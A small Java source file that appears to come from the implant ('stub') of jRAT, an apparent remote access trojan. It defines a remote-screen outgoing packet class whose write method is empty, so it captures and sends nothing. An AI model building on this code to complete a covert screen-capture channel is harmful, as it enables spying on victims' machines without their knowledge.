package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;

public class Packet17RemoteScreen extends AbstractOutgoingPacket {

	private int width;
	private int height;
	private int x;
	private int y;

	public Packet17RemoteScreen(int width, int height, int x, int y) {
		this.width = width;
		this.height = height;
		this.x = x;
		this.y = y;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
